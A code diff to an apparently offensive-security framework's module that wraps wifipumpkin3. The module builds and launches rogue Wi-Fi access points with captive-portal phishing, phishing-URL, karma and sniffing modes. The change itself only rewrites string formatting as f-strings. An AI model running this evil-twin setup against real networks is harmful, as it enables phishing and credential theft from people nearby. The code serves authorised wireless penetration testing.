@@ -114,8 +114,7 @@ class Exploit(Exploit):
         else:
             cmd.extend([
                 "--xpulp",
-                "set interface {}; set ssid {}; set proxy {}; start".format(
-                    self.interface, self.ssid, self.mode),
+                f"set interface {self.interface}; set ssid {self.ssid}; set proxy {self.mode}; start",
             ])
 
         return cmd
@@ -123,9 +122,9 @@ class Exploit(Exploit):
     def _generate_pulp_script(self) -> str:
         """Generate a .pulp automation script for wifipumpkin3."""
         lines = [
-            "set interface {}".format(self.interface),
-            "set ssid {}".format(self.ssid),
-            "set channel {}".format(self.channel),
+            f"set interface {self.interface}",
+            f"set ssid {self.ssid}",
+            f"set channel {self.channel}",
         ]
 
         if self.wireless_mode == "karma":
@@ -133,19 +132,19 @@ class Exploit(Exploit):
 
         if self.mode == "captiveflask":
             lines.append("set proxy captiveflask")
-            lines.append("set captiveflask.{}".format(self.template.lower()))
+            lines.append(f"set captiveflask.{self.template.lower()}")
         elif self.mode == "phishkin3":
             lines.append("set proxy phishkin3")
             if self.phishkin3_url:
                 safe = self._sanitize_url(self.phishkin3_url)
                 if safe:
-                    lines.append("set phishkin3.cloud_url_phishing {}".format(safe))
+                    lines.append(f"set phishkin3.cloud_url_phishing {safe}")
         elif self.mode == "evilqr3":
             lines.append("set proxy evilqr3")
             if self.evilqr3_url:
                 safe = self._sanitize_url(self.evilqr3_url)
                 if safe:
-                    lines.append("set evilqr3.url {}".format(safe))
+                    lines.append(f"set evilqr3.url {safe}")
         elif self.mode == "pumpkinproxy":
             lines.append("set proxy pumpkinproxy")
         elif self.mode == "sniffkin3":
@@ -195,17 +194,16 @@ class Exploit(Exploit):
             print_status(cmd_str)
             print_info("\nGenerated .pulp script:")
             for line in self._generate_pulp_script().split("\n"):
-                print_info("  {}".format(line))
+                print_info(f"  {line}")
             return
 
-        print_status("Launching wifipumpkin3 ({} mode)...".format(self.mode))
-        print_info("SSID: {}  Interface: {}  Wireless: {}".format(
-            self.ssid, self.interface, self.wireless_mode))
-        print_info("Command: {}".format(cmd_str))
+        print_status(f"Launching wifipumpkin3 ({self.mode} mode)...")
+        print_info(f"SSID: {self.ssid}  Interface: {self.interface}  Wireless: {self.wireless_mode}")
+        print_info(f"Command: {cmd_str}")
 
         try:
             subprocess.run(cmd, check=False)
         except KeyboardInterrupt:
             print_info("\nwifipumpkin3 interrupted by user.")
         except Exception as err:
-            print_error("wifipumpkin3 failed: {}".format(err))
+            print_error(f"wifipumpkin3 failed: {err}")
